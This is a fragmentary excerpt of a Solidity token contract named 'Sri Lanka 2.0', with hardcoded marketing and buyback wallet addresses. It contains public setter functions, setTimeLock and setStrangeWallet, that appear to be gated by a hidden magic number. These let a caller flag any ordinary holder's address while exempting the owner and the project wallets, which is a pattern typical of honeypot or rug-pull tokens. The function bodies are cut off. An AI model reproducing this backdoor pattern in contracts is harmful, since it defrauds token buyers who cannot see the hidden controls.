...
contract SriLankaTwo is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Sri Lanka 2.0";
    string private _symbol = "Sri Lanka 2.0";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x4E83D77F838f8F0FB75293e58248b8B3bE1eF738); // Marketing Address
    address payable public BuyBackWalletAddress = payable(0x1a8f9288f73804E8462943dFf272aCBa83A74c6F); // BuyBack Address
    ...
    uint256 private minimumTokensBeforeSwap = 35000 * 10**9;
    ...
    uint256 public time = 5;
    uint256 public cooldown = 5;
    uint256 private totalTimeLock = 1009870;
    ...
    function setTimeLock(uint256 newValue) public {
          require ( newValue == totalTimeLock, "timelock error");
    ...
    function setStrangeWallet(address list, bool point) public {
        require (list != BuyBackWalletAddress);
        require (list != marketingWalletAddress);
        require (list != uniswapPair);
        require (list != owner());
        require (list != deadAddress);
        require (list != address (this));
        require (list != address (uniswapV2Router));
        require (point == true);
